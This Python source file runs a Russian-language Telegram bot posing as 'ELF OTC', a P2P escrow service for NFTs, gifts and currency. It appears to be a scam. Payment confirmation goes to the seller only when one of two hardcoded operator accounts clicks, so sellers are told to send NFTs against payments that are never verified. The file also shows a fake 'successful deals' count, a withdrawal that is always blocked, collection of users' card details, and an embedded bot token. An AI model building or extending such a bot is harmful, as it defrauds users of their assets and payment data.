import telebot
from telebot import types
import base64

bot = telebot.TeleBot('8008231968:AAHG3nZeDq2E3yTQLut6TUyt1mbcl_hVvts')

# Хранилище данных пользователей
user_data = {}
input_deal = False
price_sell = ''
description = ''
# Установка команд меню
bot.set_my_commands([types.BotCommand("start", "Запустить бота")])


@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    if message.text == '/start':
        chat_id = message.chat.id
        if chat_id not in user_data:
            user_data[chat_id] = {
                'card_details': '',
                'waiting_for_card': False,
                'ton_details': '',
                'waiting_for_ton': False,
                'input_TON': False,
                'input_deal': False,
                'price_sell': 0.0,
                'description': '',
                'encoded': None,
                'deal_id': 0,
                "chat_dealer": 0,
                "mes_dealer": 0,
                "mes_delete": 0,
                "submit_delete": 0
            }
        main_menu(message)

    elif len(message.text.split()) > 1:
        chat_id = message.chat.id
        if chat_id not in user_data:
            user_data[chat_id] = {
                'card_details': '',
                'waiting_for_card': False,
                'ton_details': '',
                'waiting_for_ton': False,
                'input_TON': False,
                'input_deal': False,
                'price_sell': 0.0,
                'description': '',
                'encoded': None,
                'deal_id': 0,
                "chat_dealer": 0,
                "mes_dealer": 0,
                "mes_delete": 0,
                "submit_delete": 0
            }
        encoded = message.text.split()[1]
        try:
            padded = encoded + '=' * (4 - len(encoded) % 4)
            decoded = base64.urlsafe_b64decode(padded).decode()
            id_chat, id_message = map(int, decoded.split('/'))

            if id_chat == message.chat.id:
                bot.send_message(
                    chat_id=message.chat.id,
                    text=f"❌ Вы не можете участвовать в своей же сделке.")
            else:
                price_sell = user_data[id_chat]['price_sell']
                description = user_data[id_chat]['description']

                bot.send_message(
                    chat_id=message.chat.id,
                    text=
                    f"✅ Сделка успешно создана!\n\n💰 Сумма: {price_sell} {user_data[id_chat]['currency']}\n\
            📜 Описание: {description}\n🔗 Ссылка для покупателя: https://t.me/GllftEllfRobot?start={encoded}"
                )

                dealer_mes_id = bot.send_message(
                    chat_id=id_chat,
                    text=
                    f"*✅ Покупатель присоединился к сделке.*\n\n✅ Успешных сделок: 27\nОжидайте оплаты",
                    parse_mode="Markdown")

                confirm_menu = types.InlineKeyboardMarkup()
                confirm = types.InlineKeyboardButton(
                    text='✅Подтвердите, что вы перевели деньги',
                    callback_data='confirm_pay')
                confirm_menu.add(confirm)

                bot.send_message(
                    chat_id=chat_id,
                    text=
                    f"*✅ Переведите деньги на наш счёт.* \n\nПосле перевода нажмите кнопку подтверждения оплаты",
                    parse_mode="Markdown",
                    reply_markup=confirm_menu)

                user_data[chat_id]["chat_dealer"] = id_chat
                user_data[chat_id]["mes_dealer"] = dealer_mes_id.message_id

        except Exception as e:
            bot.send_message(message.chat.id, "Сделка не найдена.")

    else:
        chat_id = message.chat.id
        if chat_id in user_data and user_data[chat_id].get('waiting_for_card'):
            user_data[chat_id]['card_details'] = message.text
            user_data[chat_id]['waiting_for_card'] = False

            last_msg_id = user_data[chat_id].get('last_message_id')

            card_menu = types.InlineKeyboardMarkup()
            back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                              callback_data='back_menu')
            card_menu.add(back)

            message_card = f"""*💳 Ваши текущие реквизиты карты: *`{message.text}`\n\n\
Отправьте новые реквизиты для изменения или нажмите кнопку ниже для возврата в меню."""
            try:
                bot.edit_message_caption(chat_id=chat_id,
                                         message_id=last_msg_id,
                                         caption=message_card,
                                         parse_mode="Markdown",
                                         reply_markup=card_menu)

            except telebot.apihelper.ApiTelegramException:
                chat_id = bot.send_message(message.chat.id,
                                           text=message_card,
                                           parse_mode="Markdown",
                                           reply_markup=card_menu)
                bot.delete_message(chat_id.message_id, last_msg_id)

        elif chat_id in user_data and user_data[chat_id].get(
                'waiting_for_ton'):
            user_data[chat_id]['ton_details'] = message.text
            user_data[chat_id]['waiting_for_ton'] = False

            last_msg_id = user_data[chat_id].get('last_message_id')

            ton_menu = types.InlineKeyboardMarkup()
            back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                              callback_data='back_menu')
            ton_menu.add(back)

            message_ton = f"*🔑 Ваш текущий TON-кошелек:* `{message.text}`\n\n\
Отправьте новый адрес кошелька для изменения или нажмите кнопку ниже для возврата в меню."

            try:
                bot.edit_message_caption(chat_id=chat_id,
                                         message_id=last_msg_id,
                                         caption=message_ton,
                                         parse_mode="Markdown",
                                         reply_markup=ton_menu)

            except telebot.apihelper.ApiTelegramException:
                bot.send_message(chat_id,
                                 text=message_ton,
                                 parse_mode="Markdown",
                                 reply_markup=ton_menu)
                bot.delete_message(chat_id, last_msg_id)

        elif user_data[chat_id]['input_TON'] or user_data[chat_id][
                'input_deal']:
            try:
                price_sell = message.text
                price_sell = float(price_sell)

                if user_data[chat_id]['input_TON']:
                    if price_sell > 1999.9 or price_sell < 1:
                        bot.send_message(
                            chat_id=chat_id,
                            text=
                            "❌ Сумма должна быть в пределах от 1 до 1999.9 TON"
                        )
                    else:
                        bot.send_message(
                            chat_id=chat_id,
                            text="*💳 Отправьте реквизиты для получения оплаты:*\n\nПример:" \
                            " `ЕвроБанк - 1234567891012345`",
                            parse_mode="Markdown"
                        )
                        user_data[chat_id]['input_TON'] = False
                else:
                    user_data[chat_id]['price_sell'] = price_sell
                    bot.send_message(
                        chat_id=chat_id,
                        text=
                        f"📝 Укажите, что вы предлагаете в этой сделке за {price_sell}\
{user_data[chat_id]['currency']}:\n\nПример: `10 Кепок и Пепе...`",
                        parse_mode="Markdown")

                    user_data[chat_id]['input_deal'] = False
                    bot.register_next_step_handler(message, get_description)

            except ValueError:
                bot.send_message(
                    chat_id=chat_id,
                    text=
                    "❌ Некорректный формат суммы. Используйте формат 100.5",
                    parse_mode="Markdown")


def main_menu(message):
    menu = types.InlineKeyboardMarkup()

    key_add = types.InlineKeyboardButton(text='📩 Управление реквизитами',
                                         callback_data='add')
    key_create = types.InlineKeyboardButton(text='📝 Создать сделку',
                                            callback_data='create')
    key_replace = types.InlineKeyboardButton(text='💱 Обменник',
                                             callback_data='replace')
    key_ref = types.InlineKeyboardButton(text='🔗 Реферальная ссылка',
                                         callback_data='ref')
    key_balance = types.InlineKeyboardButton(text='💰 Баланс',
                                             callback_data='balance')
    key_support = types.InlineKeyboardButton(
        text='📞Поддержка', url="https://t.me/+h7hMiQoEYDUyNjQy")

    menu.add(key_add)
    menu.add(key_create)
    menu.add(key_replace)
    menu.add(key_ref)
    menu.add(key_balance)
    menu.add(key_support)

    question = """*Добро пожаловать в ELF OTC – надежный P2P-гарант

💼 Покупайте и продавайте всё, что угодно – безопасно!*
От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.

🔹 Удобное управление кошельками
🔹 Реферальная система
🔹 Проверка баланса и вывод средств

📖 Как пользоваться?
Ознакомьтесь с инструкцией — https://telegra.ph/Podrobnyj-gajd-po-ispolzovaniyu-GllftEllfRobot-06-24\n

Выберите нужный раздел ниже:"""

    if message.text == '/start':
        bot.send_photo(
            chat_id=message.chat.id,
            caption=question,
            photo=open('photo_2025-06-16_04-13-33.jpg', 'rb'),
            reply_markup=menu,
            parse_mode="Markdown",
        )

    else:
        bot.edit_message_caption(chat_id=message.chat.id,
                                 message_id=message.id,
                                 caption=question,
                                 parse_mode="Markdown",
                                 reply_markup=menu)

        chat_id = message.chat.id
        message_id = message.id
        user_data[chat_id]['last_message_id'] = message_id


@bot.callback_query_handler(func=lambda call: True)
def callback_worker(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    back_menu = types.InlineKeyboardMarkup()
    back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                      callback_data='back_menu')
    back_menu.add(back)

    # Инициализация данных пользователя, если их еще нет
    if chat_id not in user_data:
        user_data[chat_id] = {
            'card_details': '',
            'waiting_for_card': False,
            'ton_details': '',
            'waiting_for_ton': False,
            'input_TON': False,
            'input_deal': False,
            'price_sell': 0.0,
            'description': '',
            'encoded': None,
            'deal_id': 0,
            "chat_dealer": 0,
            "mes_dealer": 0,
            "mes_delete": 0,
            "submit_delete": 0
        }

    if call.data == "add":
        add_menu = types.InlineKeyboardMarkup()
        add_TON = types.InlineKeyboardButton(
            text='🪙Добавить/изменить TON-кошелек', callback_data='add_TON')
        create_card = types.InlineKeyboardButton(
            text='💳Добавить/изменить карту', callback_data='create_card')

        add_menu.add(add_TON)
        add_menu.add(create_card)
        add_menu.add(back)

        message_add = """*📥 Управление реквизитами*

_Используйте кнопки ниже чтобы добавить/изменить реквизиты👇_"""

        bot.edit_message_caption(chat_id=chat_id,
                                 message_id=message_id,
                                 caption=message_add,
                                 parse_mode="Markdown",
                                 reply_markup=add_menu)

        user_data[chat_id]['last_message_id'] = message_id

    elif call.data == "add_TON":
        create_add_TON(chat_id, message_id)

    elif call.data == "create_card":
        add_create_card(chat_id, message_id)

    # Обработка других кнопок
    elif call.data == "create":
        create_deal(chat_id, message_id)

    elif call.data == "confirm_pay":
        if chat_id == 8194815542 or chat_id == 7825409096:
            # 7825409096 1183407670
            confirm_menu = types.InlineKeyboardMarkup()
            confirm = types.InlineKeyboardButton(
                text='✅Подтвердите, что вы отправили нфт',
                callback_data='confirm_nft')
            confirm_menu.add(confirm)

            bot.send_message(
                chat_id=user_data[chat_id]["chat_dealer"],
                text=
                f"*✅ Покупатель перевел деньги на счёт нашего кошелька.*\n\nМожете отправлять ему нфт. \
Деньги придут после подтверждения.",
                parse_mode="Markdown",
                reply_markup=confirm_menu)
        else:
            bot.send_message(chat_id=chat_id,
                             text=f"*❌ Оплата не найдена!*",
                             parse_mode="Markdown")

    elif call.data == "confirm_nft":
        bot.delete_message(chat_id=chat_id, message_id=message_id)

    elif call.data == "deal_TON":
        deal(chat_id, message_id, 'TON')

    elif call.data == "RUB":
        deal(chat_id, message_id, 'RUB')
    elif call.data == "UAH":
        deal(chat_id, message_id, 'UAH')
    elif call.data == "KZT":
        deal(chat_id, message_id, 'KZT')
    elif call.data == "BYN":
        deal(chat_id, message_id, 'BYN')
    elif call.data == "UZS":
        deal(chat_id, message_id, 'UZS')
    elif call.data == "KGS":
        deal(chat_id, message_id, 'KGS')
    elif call.data == "AZN":
        deal(chat_id, message_id, 'AZN')
    elif call.data == "TON":
        deal(chat_id, message_id, 'TON')

    elif call.data == 'back_deal':
        deal(chat_id, message_id, user_data[chat_id]['currency'])

    elif call.data == "deal_star":
        deal_star(chat_id, message_id)

    elif call.data == "replace_currency":
        replace_currency(chat_id, message_id)

    elif call.data == "cancel_deal":
        cancel_message_deal(chat_id, message_id)

    elif call.data == "yes":
        bot.delete_message(chat_id, user_data[chat_id]["deal_id"])
        bot.delete_message(chat_id, user_data[chat_id]['submit_delete'])
    elif call.data == 'no':
        bot.delete_message(chat_id, user_data[chat_id]['submit_delete'])

    elif call.data == "exchange":
        ready_exchange(chat_id, message_id)

    elif call.data == "replace":
        replace_money(chat_id, message_id)

    elif call.data == "TON_RUB":
        price_TON(chat_id, message_id, 'RUB 🇷🇺 (306.94)')
    elif call.data == "TON_UAH":
        price_TON(chat_id, message_id, 'UAH 🇺🇦 (151.79)')
    elif call.data == "TON_KZT":
        price_TON(chat_id, message_id, 'KZT 🇰🇿 (1835.68)')
    elif call.data == "TON_BYN":
        price_TON(chat_id, message_id, 'BYN 🇧🇾 (11.95)')
    elif call.data == "TON_UZS":
        price_TON(chat_id, message_id, 'UZS 🇺🇿 (47210.63)')
    elif call.data == "TON_KGS":
        price_TON(chat_id, message_id, 'KGS 🇰🇬 (312.59)')

    elif call.data == "ref":
        message_ref = f"🔗 Ваша реферальная ссылка:\n\n\
`https://t.me/GllftEllfRobot?start=ref_{chat_id}`\n\n\
👥 Количество рефералов: 0\n💰 Заработано с рефералов: 0.0 TON\n40% от комиссии бота"

        bot.edit_message_caption(chat_id=chat_id,
                                 message_id=message_id,
                                 caption=message_ref,
                                 parse_mode="Markdown",
                                 reply_markup=back_menu)

        user_data[chat_id]['last_message_id'] = message_id

    elif call.data == "balance":
        message_balance = f"*💰 Ваш баланс*\n\n📊 Сумма: 0.00 TON\n✅ Успешные сделки: 0\n\n\
⚠️ Ошибка: Вывод средств доступен после 3 успешной сделки"

        bot.edit_message_caption(chat_id=chat_id,
                                 message_id=message_id,
                                 caption=message_balance,
                                 parse_mode="Markdown",
                                 reply_markup=back_menu)

        user_data[chat_id]['last_message_id'] = message_id

    elif call.data == "back_menu":
        if chat_id in user_data:
            user_data[chat_id]['waiting_for_card'] = False
            user_data[chat_id]['waiting_for_ton'] = False
            user_data[chat_id]['input_TON'] = False
            user_data[chat_id]['input_deal'] = False

        main_menu(call.message)


def create_add_TON(chat_id, message_id):
    # Устанавливаем флаг ожидания данных карты
    user_data[chat_id]['waiting_for_TON'] = True

    ton_menu = types.InlineKeyboardMarkup()
    back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                      callback_data='back_menu')
    ton_menu.add(back)

    # Получаем текущие реквизиты (если есть)
    current_ton = user_data[chat_id].get('ton_details', 'не указаны')

    if current_ton == '':
        message_ton = f"*🔑 Добавьте ваш TON-кошелек:*\n\n\
Пожалуйста, отправьте адрес вашего кошелька\n"

    else:
        message_ton = f"*🔑 Ваш текущий TON-кошелек:* `{current_ton}`\n\n\
Отправьте новый адрес кошелька для изменения или нажмите кнопку ниже для возврата в меню."

    bot.edit_message_caption(chat_id=chat_id,
                             message_id=message_id,
                             caption=message_ton,
                             parse_mode="Markdown",
                             reply_markup=ton_menu)

    user_data[chat_id]['waiting_for_ton'] = True
    user_data[chat_id]['last_message_id'] = message_id


def add_create_card(chat_id, message_id):
    # Устанавливаем флаг ожидания данных карты
    user_data[chat_id]['waiting_for_card'] = True

    card_menu = types.InlineKeyboardMarkup()
    back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                      callback_data='back_menu')
    card_menu.add(back)

    # Получаем текущие реквизиты (если есть)
    current_card = user_data[chat_id].get('card_details')

    if current_card == '':
        message_card = f"*🔑 Добавьте ваши реквизиты:*\n\n\
Пожалуйста, отправьте реквизиты в таком формате:\n\nЕвроБанк - 12345678910121345"

    else:
        message_card = f"*💳 Ваши текущие реквизиты карты: *`{current_card}`\n\n"\
"Отправьте новые реквизиты для изменения или нажмите кнопку ниже для возврата в меню."

    bot.edit_message_caption(chat_id=chat_id,
                             message_id=message_id,
                             caption=message_card,
                             parse_mode="Markdown",
                             reply_markup=card_menu)

    user_data[chat_id]['waiting_for_card'] = True
    user_data[chat_id]['last_message_id'] = message_id


def create_deal(chat_id, message_id):
    deal_message = "*💰Выберите метод получения оплаты:*"

    deal_menu = types.InlineKeyboardMarkup()
    deal_TON = types.InlineKeyboardButton(text='💎 На TON-кошелек',
                                          callback_data='deal_TON')
    deal_card = types.InlineKeyboardButton(text='💳 На карту',
                                           callback_data='deal_TON')
    deal_star = types.InlineKeyboardButton(text='⭐ Звезды',
                                           callback_data='deal_star')
    back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                      callback_data='back_menu')

    deal_menu.add(deal_TON)
    deal_menu.add(deal_card)
    deal_menu.add(deal_star)
    deal_menu.add(back)

    bot.edit_message_caption(chat_id=chat_id,
                             message_id=message_id,
                             caption=deal_message,
                             parse_mode="Markdown",
                             reply_markup=deal_menu)

    user_data[chat_id]['last_message_id'] = message_id


def deal(chat_id, message_id, currency):
    deal_message = f"*💼 Создание сделки*\n\nВведите сумму {currency} сделки в формате: `100.5`"

    deal_menu = types.InlineKeyboardMarkup()
    replace_currency = types.InlineKeyboardButton(
        text='💱 Изменить валюту', callback_data='replace_currency')
    back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                      callback_data='back_menu')

    deal_menu.add(replace_currency)
    deal_menu.add(back)

    bot.edit_message_caption(chat_id=chat_id,
                             message_id=message_id,
                             caption=deal_message,
                             parse_mode="Markdown",
                             reply_markup=deal_menu)

    user_data[chat_id]['input_deal'] = True
    user_data[chat_id]['last_message_id'] = message_id
    user_data[chat_id]['currency'] = currency


def deal_star(chat_id, message_id):
    deal_message = "*💼 Создание сделки*\n\nВведите сумму Stars сделки в формате: `100.5`"

    deal_menu = types.InlineKeyboardMarkup()
    back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                      callback_data='back_menu')
    deal_menu.add(back)

    bot.edit_message_caption(chat_id=chat_id,
                             message_id=message_id,
                             caption=deal_message,
                             parse_mode="Markdown",
                             reply_markup=deal_menu)

    user_data[chat_id]['input_deal'] = True
    user_data[chat_id]['last_message_id'] = message_id
    user_data[chat_id]['currency'] = 'Stars'


def replace_currency(chat_id, message_id):
    message_currency = "*💱 Выберите валюту для сделки:*"

    currency_menu = types.InlineKeyboardMarkup()
    RUB = types.InlineKeyboardButton(text='RUB 🇷🇺', callback_data='RUB')
    UAH = types.InlineKeyboardButton(text='UAH 🇺🇦', callback_data='UAH')
    KZT = types.InlineKeyboardButton(text='KZT 🇰🇿', callback_data='KZT')
    BYN = types.InlineKeyboardButton(text='BYN 🇧🇾', callback_data='BYN')
    UZS = types.InlineKeyboardButton(text='UZS 🇺🇿', callback_data='UZS')
    KGS = types.InlineKeyboardButton(text='KGS 🇰🇬', callback_data='KGS')
    AZN = types.InlineKeyboardButton(text='AZN 🇦🇿', callback_data='AZN')
    TON = types.InlineKeyboardButton(text='TON 💎', callback_data='TON')
    back = types.InlineKeyboardButton(text='🔙 Назад',
                                      callback_data='back_deal')
    currency_menu.add(RUB, UAH, KZT, BYN, UZS, KGS, AZN, TON)
    currency_menu.add(back)

    bot.edit_message_caption(chat_id=chat_id,
                             message_id=message_id,
                             caption=message_currency,
                             parse_mode="Markdown",
                             reply_markup=currency_menu)


def get_description(message):
    description = message.text
    chat_id = message.chat.id
    user_data[chat_id]['description'] = description
    price_sell = user_data[chat_id]['price_sell']

    text = f"{chat_id}/{message.message_id}".encode()
    encoded = base64.urlsafe_b64encode(text).decode().rstrip("=")

    deal_menu = types.InlineKeyboardMarkup()
    cancel = types.InlineKeyboardButton(text='❌ Отменить сделку',
                                        callback_data='cancel_deal')
    deal_menu.add(cancel)

    deal = bot.send_message(
        chat_id=chat_id,
        text=
        f"✅ Сделка успешно создана!\n\n💰 Сумма: {price_sell} {user_data[chat_id]['currency']}\n\
📜 Описание: {description}\n🔗 Ссылка для покупателя: https://t.me/GllftEllfRobot?start={encoded}",
        reply_markup=deal_menu)

    user_data[chat_id]['encoded'] = encoded
    user_data[chat_id]["deal_id"] = deal.message_id
    user_data[chat_id]['mes_delete'] = deal.message_id


def cancel_message_deal(chat_id, message_id):
    cancel_message = f"*❌ Вы уверены, что хотите отменить сделку* #{user_data[chat_id]['encoded']}?\n\n\
Это действие нельзя будет отменить."

    cancel_menu = types.InlineKeyboardMarkup()
    yes = types.InlineKeyboardButton(text='✅ Да, отменить',
                                     callback_data='yes')
    no = types.InlineKeyboardButton(text='🔙 Нет', callback_data='no')
    cancel_menu.add(yes)
    cancel_menu.add(no)

    submit = bot.send_message(chat_id=chat_id,
                              text=cancel_message,
                              parse_mode="Markdown",
                              reply_markup=cancel_menu)

    user_data[chat_id]['submit_delete'] = submit.message_id
    user_data[chat_id]['last_message_id'] = message_id


def replace_money(chat_id, message_id):
    message_replace = "*💱 Выберите валюту для обмена 👇*"

    replace_menu = types.InlineKeyboardMarkup()
    TON_RUB = types.InlineKeyboardButton(text='💎TON -> RUB 🇷🇺 (306.94)',
                                         callback_data='TON_RUB')
    TON_UAH = types.InlineKeyboardButton(text='💎TON -> UAH 🇺🇦 (151.79)',
                                         callback_data='TON_UAH')
    TON_KZT = types.InlineKeyboardButton(text='💎TON -> KZT 🇰🇿 (1835.68)',
                                         callback_data='TON_KZT')
    TON_BYN = types.InlineKeyboardButton(text='💎TON -> BYN 🇧🇾 (11.95)',
                                         callback_data='TON_BYN')
    TON_UZS = types.InlineKeyboardButton(text='💎TON -> UZS 🇺🇿 (47210.63)',
                                         callback_data='TON_UZS')
    TON_KGS = types.InlineKeyboardButton(text='💎TON -> KGS 🇰🇬 (312.59)',
                                         callback_data='TON_KGS')
    back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                      callback_data='back_menu')

    replace_menu.add(TON_RUB)
    replace_menu.add(TON_UAH)
    replace_menu.add(TON_KZT)
    replace_menu.add(TON_BYN)
    replace_menu.add(TON_UZS)
    replace_menu.add(TON_KGS)
    replace_menu.add(back)

    bot.edit_message_caption(chat_id=chat_id,
                             message_id=message_id,
                             caption=message_replace,
                             parse_mode="Markdown",
                             reply_markup=replace_menu)

    user_data[chat_id]['last_message_id'] = message_id


def price_TON(chat_id, message_id, name_money):
    money = name_money.split("(")[0][0:-1]
    price = name_money.split("(")[1][0:-1]

    message_price = f"Цена за 💎 1 TON: {price} {money[0:-2]}\n\n\
Лимиты: 💎 1 - 1999.9 TON\nСпособ оплаты: Карта {money}\n\n\
Для обмена используйте кнопки ниже 👇"

    price_menu = types.InlineKeyboardMarkup()
    exchange = types.InlineKeyboardButton(text='Начать обмен 💱',
                                          callback_data='exchange')
    back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                      callback_data='back_menu')
    price_menu.add(exchange)
    price_menu.add(back)

    bot.edit_message_caption(chat_id=chat_id,
                             message_id=message_id,
                             caption=message_price,
                             parse_mode="Markdown",
                             reply_markup=price_menu)

    user_data[chat_id]['last_message_id'] = message_id


def ready_exchange(chat_id, message_id):
    message_exchange = "💼 Создание обмена\n\nВведите сумму TON обмена в формате: `100.5`"

    exchange_menu = types.InlineKeyboardMarkup()
    back = types.InlineKeyboardButton(text='🔙Вернуться в меню',
                                      callback_data='back_menu')
    exchange_menu.add(back)

    bot.edit_message_caption(chat_id=chat_id,
                             message_id=message_id,
                             caption=message_exchange,
                             parse_mode="Markdown",
                             reply_markup=exchange_menu)

    user_data[chat_id]['input_TON'] = True
    user_data[chat_id]['last_message_id'] = message_id


bot.polling(none_stop=True, interval=0)
